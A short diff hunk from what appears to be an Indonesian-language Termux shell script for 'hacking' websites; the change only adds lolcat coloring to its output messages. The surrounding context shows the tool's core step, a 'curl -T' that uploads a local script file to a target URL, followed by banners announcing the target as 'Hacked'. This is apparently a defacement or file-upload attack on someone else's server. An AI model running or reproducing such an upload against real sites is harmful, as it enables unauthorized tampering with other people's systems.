@@ -54,8 +54,8 @@ echo $cyan
 echo loading..
 curl -T /storage/emulated/0/$script $target
 echo $red
-echo [$target~Hacked]
-echo Target Terhack Pada
+echo [$target~Hacked] | lolcat
+echo Target Terhack Pada | lolcat
 date | lolcat
 echo $green
 echo terimakasih $ta telah menggunakan tools ini
